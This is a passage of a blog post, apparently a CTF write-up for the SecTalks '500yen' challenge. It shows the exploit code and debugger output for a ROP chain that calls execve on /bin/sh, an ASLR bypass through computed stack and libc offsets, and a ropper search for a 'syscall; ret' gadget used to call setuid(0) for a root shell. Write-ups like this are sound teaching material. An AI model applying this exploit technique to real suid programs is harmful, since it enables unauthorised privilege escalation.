+        <span class=mi>3</span>  <span class=c1># cmd, *cmd, 0</span>
+    <span class=p>)</span>  <span class=c1># = 11</span>
+
+    <span class=n>rdi</span> <span class=o>=</span> <span class=n>return_address_address</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>8</span>  <span class=c1># point to cmd</span>
+    <span class=n>rsi</span> <span class=o>=</span> <span class=n>return_address_address</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>9</span>  <span class=c1># point to char * argv[] (point to rdi followed by 0)</span>
+
+    <span class=n>solution</span> <span class=o>=</span> <span class=p>[</span><span class=n>pop_print</span><span class=p>()]</span> <span class=o>*</span> <span class=p>(</span><span class=mi>18</span> <span class=o>+</span> <span class=n>rop_chain_length</span><span class=p>)</span> <span class=o>+</span> <span class=p>[</span>
+        <span class=n>push_uint64</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>([</span>
+            <span class=n>rax_call</span><span class=p>,</span>
+            <span class=n>rax</span><span class=p>,</span>
+            <span class=n>rdi_call</span><span class=p>,</span>
+            <span class=n>rdi</span><span class=p>,</span>
+            <span class=n>rdx_rsi_call</span><span class=p>,</span>
+            <span class=n>rdx</span><span class=p>,</span>
+            <span class=n>rsi</span><span class=p>,</span>
+            <span class=n>syscall</span><span class=p>,</span>
+            <span class=n>cmd</span><span class=p>,</span>
+            <span class=n>rdi</span><span class=p>,</span>
+            <span class=mi>0</span><span class=p>,</span>
+        <span class=p>])</span>
+    <span class=p>]</span>
+    <span class=n>write</span><span class=p>(</span><span class=o>*</span><span class=n>solution</span><span class=p>)</span>
+</pre></div> <p>Then running the executable:</p> <div class=highlight><pre><span></span>gef&gt; r
+Starting program: /blah/main
+0x0
+...
+0x7fffffffd6ee
+0x0
+0x7fffffffd6f0
+0x555555555822    # Saved return address
+0x7fffffffd7d8    # $rbp+0x108
+0x100000000
+0x555555555830
+0x7ffff7a2d830    # $libc+0x20830 (libc vmmaped at 0x7ffff7a0d000)
+0x1
+0x7fffffffd7d8
+0x1f7ffcca0
+0x555555555809
+0x0
+0x34f8d2d9efaa1034
+process 18599 is executing new program: /bin/dash
+$ 
+</pre></div> <h2 id=aslr-bypass>ASLR bypass</h2> <p>Unfortunately, if you run the executable on the challenge box, it fails. If you look at the printed addresses, they subtly change each time you run the executable due to the <em>anti-hacker protection</em> called Address Space Layout Randomisation (ASLR). At this point, it was obvious that the purpose of ASLR was just to make me cry.</p> <p>Turn ASLR back on: <code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code></p> <p>If we can&rsquo;t hardcode the addresses of libc functions or our <code>/bin/sh</code> string, what can we do?</p> <p>We&rsquo;ve already worked out our addresses as offsets from:</p> <ul> <li>address of the start of the ROP chain (<code>return_address_address=$rbp+8</code>)</li> <li>address of the start of libc</li> </ul> <p>We notice that due to some magic in <code>_start</code>, the value popped after the saved return address (at <code>$rbp+16</code>) = <code>$rbp+0x108</code>:</p> <div class=highlight><pre><span></span>&gt; x/2g $rbp+8
+0x7fffffffd6d8: 0x0000555555555822      0x00007fffffffd7d8
+</pre></div> <p>This gives us a way to calculate the offset, using some other stack-machine commands.</p> <div class=highlight><pre><span></span>pop_print() * 19  # pop saved return address, set top of stack to $rbp+16
+pop_to_nth_global(99)  # save $rbp+0x108 in global 99
+pop_print()
+push_uint64(0x100)
+push_nth_global(99)  # stack is now [$rbp+0x108, 0x100]
+subtract_top_from_pop()
+pop_to_nth_global(99)  # save $rbp+8 (i.e. return_address_address) to global 99
+</pre></div> <p>When we want to calculate <code>rdi</code> and <code>rsi</code>, we can:</p> <ul> <li><code>push_uint64(offset from return_address_address)</code></li> <li><code>push_nth_global(99)</code></li> <li><code>pop_add_to_top()</code></li> </ul> <p>Do the same for <code>libc</code> by finding the return address to <code>__libc_start_main+240</code> in the stack. With a bit of care not to mess up the number of pushes and pops you&rsquo;ll get a shell:</p> <div class=highlight><pre><span></span>$ whoami
+user
+</pre></div> <p><figure><img alt="Oh no!" src=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/sectalks-ctf-rop-aslr-500y/500yenexecve.png><figcaption>Oh no!</figcaption></figure></p> <h2 id=whoami>whoami</h2> <p>I thought due to suid we would be running as root! Actually on linux there are multiple user ids.</p> <p>Suid executables are launched with the <em>Effective UID</em> as the file owner (root here). Most syscalls use this for access checks. The <em>Real UID</em> is still set to the user who launched the process.</p> <p>Most modern shells (including <code>/bin/sh</code>) have a protection mechanism which, on startup, sets the Effective UID to the Real UID, dropping our root privileges. We can work around this by either:</p> <ul> <li>Copying over a shell which doesn&rsquo;t drop permissions, and <code>execve</code>ing it</li> <li>Directly calling <code>/bin/cat file</code> and not getting a shell</li> <li>Calling the <code>setuid</code> syscall to set our Real UID before running the <code>execve</code> call (I chose this way)</li> </ul> <p>Checking the <a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ >x64 call table</a> again, we just need to set <code>rax</code> to 105 and <code>rdi</code> to 0 (uid of root). This time, the <code>syscall</code> gadget must be followed by a <code>ret</code> so we can make the <code>execve</code> call afterwards. Pwntools isn&rsquo;t helpful here, so we&rsquo;ll use <a href=https://github.com/sashs/Ropper>ropper</a> which was installed with pwntools.</p> <div class=highlight><pre><span></span>$ ropper --file libc-2.28.so --search <span class=s2>&quot;syscall; ret;&quot;</span>
+<span class=o>[</span>INFO<span class=o>]</span> Load gadgets <span class=k>for</span> section: LOAD
+<span class=o>[</span>LOAD<span class=o>]</span> loading... <span class=m>100</span>%
+<span class=o>[</span>LOAD<span class=o>]</span> removing double gadgets... <span class=m>100</span>%
+<span class=o>[</span>INFO<span class=o>]</span> Searching <span class=k>for</span> gadgets: syscall<span class=p>;</span> ret<span class=p>;</span>
+
+<span class=o>[</span>INFO<span class=o>]</span> File: libc-2.28.so
+0x00000000000b5b35: syscall<span class=p>;</span> ret<span class=p>;</span>
+</pre></div> <p>Enjoy the root shell and check out the <a href=https://github.com/sectalks/sectalks/blob/9273a1d60b4450b9ce21f75b5fb6163eb7df5612/ctf-solutions/LON0x27/bc/500yen.py>python code</a> for generating <code>code.bin</code>.</p> </div> <div class=tags>Tags: <ul><li><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/tag/security>security</a></li><li><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/tag/ctf>ctf</a></li></ul></div> </article> </main> <footer> <br><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ>[blog by caller]</a> Correspondence welcome at ℬ㏒ {@} ㎈ℓℯℛ.ⓧⓨℤ </footer> </body> </html>
